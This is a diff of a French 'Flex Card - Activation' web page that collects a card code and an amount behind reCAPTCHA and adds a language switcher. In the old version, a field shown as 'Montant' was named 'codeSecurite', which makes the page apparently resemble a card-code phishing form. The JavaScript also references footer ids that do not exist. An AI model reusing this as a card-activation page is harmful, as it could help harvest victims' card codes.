@@ -1,50 +1,89 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Flex Card - Activation</title>
-  <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="styles.css" />
   <script src="https://www.google.com/recaptcha/api.js" async defer></script>
-  <script>
-    function validerFormulaire() {
-      const codeCarte = document.getElementById("code").value;
-      const montant = document.getElementById("montant").value;
-
-      if (!/^\d{1,16}$/.test(codeCarte)) {
-        alert("Le code de la carte doit contenir uniquement des chiffres (max 16).");
-        return false;
-      }
-
-      if (!/^\d+(\.\d{1,2})?$/.test(montant)) {
-        alert("Le montant doit être un nombre valide (sans lettres).");
-        return false;
-      }
-
-      return true;
-    }
-  </script>
 </head>
 <body>
   <div class="container">
-    <img src="logo.png" alt="Flex Card" class="logo">
-    <h2>Bienvenue</h2>
-    <p>Pour activer votre carte, entrez le code de la carte et le montant.</p>
-    
-    <form action="/envoyer-code" method="POST" onsubmit="return validerFormulaire();">
-      <input type="text" name="numeroCarte" id="code" maxlength="16" placeholder="Code de la carte" required>
-      <input type="text" name="codeSecurite" id="montant" placeholder="Montant" required>
+    <header>
+      <h1 class="logo">Flex Card</h1>
+      <div class="language-switcher">
+        <label for="lang">Langue:</label>
+        <select id="lang" onchange="switchLanguage(this.value)">
+          <option value="fr">Français</option>
+          <option value="en">English</option>
+        </select>
+      </div>
+    </header>
 
-      <div class="g-recaptcha" data-sitekey="6Lc49BkrAAAAAED5fyYu7EA57NFm3kcOM9KjZkTt"></div>
+    <main>
+      <div class="form-container">
+        <h2 id="title-text">Bienvenue</h2>
+        <form action="/send" method="POST">
+          <label for="code" id="label-code">Code de la carte</label>
+          <input type="text" id="code" name="code" maxlength="16" placeholder="Entrez le code" required />
 
-      <button type="submit">Activer ma carte</button>
-    </form>
+          <label for="amount" id="label-amount">Montant</label>
+          <input type="number" id="amount" name="amount" placeholder="Entrez le montant" required />
 
-    <div class="footer">
-      <a href="index.html">Accueil</a>
-      <a href="a-propos.html">À propos</a>
-      <a href="confidentialite.html">Politique de confidentialité</a>
-    </div>
+          <div class="g-recaptcha" data-sitekey="6Lc1nR4rAAAAAJOR11moTvVKGjCD6Qw4amYtqzws"></div>
+
+          <button type="submit" id="submit-button">Activer ma carte</button>
+        </form>
+      </div>
+    </main>
+
+    <footer>
+      <p>
+         <a href="index.html">Accueil</a>
+         <a href="a-propos.html">À propos</a>
+         <a href="confidentialite.html">Politique de confidentialité</a>
+      </p>
+    </footer>
   </div>
-</body>
-</html>
+
+  <script>
+    const translations = {
+      fr: {
+        title: "Bienvenue",
+        cardCode: "Code de la carte",
+        amount: "Montant",
+        placeholderCode: "Entrez le code",
+        placeholderAmount: "Entrez le montant",
+        activate: "Activer ma carte",
+        accueil: "Accueil",
+        apropos: "À propos",
+        privacy: "Politique de confidentialité"
+      },
+      en: {
+        title: "Welcome",
+        cardCode: "Card code",
+        amount: "Amount",
+        placeholderCode: "Enter card code",
+        placeholderAmount: "Enter amount",
+        activate: "Activate my card",
+        accueil: "Home",
+        apropos: "About",
+        privacy: "Privacy Policy"
+      }
+    };
+
+    function switchLanguage(lang) {
+      document.getElementById("title-text").textContent = translations[lang].title;
+      document.getElementById("label-code").textContent = translations[lang].cardCode;
+      document.getElementById("label-amount").textContent = translations[lang].amount;
+      document.getElementById("code").placeholder = translations[lang].placeholderCode;
+      document.getElementById("amount").placeholder = translations[lang].placeholderAmount;
+      document.getElementById("submit-button").textContent = translations[lang].activate;
+      document.getElementById("footer-home").textContent = translations[lang].accueil;
+      document.getElementById("footer-about").textContent = translations[lang].apropos;
+      document.getElementById("footer-policy").textContent = translations[lang].privacy;
+    }
+  </script>
+ <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+ </body>
+ </html>
